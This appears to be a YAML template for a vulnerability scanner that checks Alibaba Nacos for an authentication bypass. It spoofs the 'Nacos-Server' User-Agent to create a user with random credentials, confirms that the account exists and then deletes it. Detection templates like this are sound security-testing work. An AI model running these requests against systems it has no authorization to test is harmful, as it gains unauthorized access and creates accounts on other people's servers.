cve-id: alibaba-nacos-authbypass
set:
  r1: randomLowercase(16)
  r2: randomLowercase(16)
rules:
  - method: POST
    path: "/nacos/v1/auth/users?username={{r1}}&password={{r2}}"
    headers:
      User-Agent: Nacos-Server
    expression: |
      response.status == 200 && response.body.bcontains(b"create user ok!")
  - method: GET
    path: "/nacos/v1/auth/users?pageNo=1&pageSize=999"
    headers:
      User-Agent: Nacos-Server
    expression: |
      response.status == 200 && response.body.bcontains(b"{{r1}}")
  - method: DELETE
    path: "/nacos/v1/auth/users?username={{r1}}"
    headers:
      User-Agent: Nacos-Server
    expression: |
      response.status == 200 && response.body.bcontains(b"delete user ok!")
severity:
  critical
type: 
  authbypass
